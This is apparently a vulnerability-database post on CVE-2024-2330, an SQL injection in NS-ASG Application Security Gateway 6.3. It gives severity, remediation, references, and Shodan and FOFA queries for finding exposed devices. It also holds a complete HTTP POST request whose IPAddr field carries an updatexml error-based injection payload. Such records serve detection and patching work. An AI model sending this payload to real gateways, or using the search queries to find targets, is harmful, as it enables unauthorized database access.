---
layout: "post"
cve_id: "CVE-2024-2330"
title: "NS-ASG Application Security Gateway 6.3 - Sql Injection"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-2330.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-2330.yaml"
author: "s4e-io"
severity: "medium"
impact: "Authenticated attackers can extract sensitive database information via SQL injection in the NS-ASG Application Security Gateway.
"
remediation: "Update NS-ASG Application Security Gateway to a version newer than 6.3.
"
reference:
  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-2330"
  - "https://nvd.nist.gov/vuln/detail/CVE-2024-2330"
  - "https://github.com/jikedaodao/cve/blob/main/NS-ASG-sql-addmacbind.md"
  - "https://vuldb.com/?ctiid.256281"
  - "https://vuldb.com/?id.256281"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L', 'cvss-score': 6.3, 'cve-id': 'CVE-2024-2330', 'cwe-id': 'CWE-89', 'epss-score': 0.93057, 'epss-percentile': 0.99772}"
metadata: "{'max-request': 2, 'shodan-query': 'http.title:‚ÄúNS-ASG‚Äù', 'fofa-query': 'app="ÁΩëÂ∫∑ÁßëÊäÄ-NS-ASGÂÆâÂÖ®ÁΩëÂÖ≥"'}"
tags:
  - "cve"
  - "cve2024"
  - "ns-asg"
  - "sqli"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
A vulnerability was found in Netentsec NS-ASG Application Security Gateway 6.3. It has been classified as critical. This affects an unknown part of the file /protocol/index.php. The manipulation of the argument IPAddr leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.


## üåê HTTP Request
```nohighlight
POST /protocol/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15
Connection: close
Content-Length: 263
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0'and(updatexml(1,concat(0x7e,(select+version())),1))='\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}
```

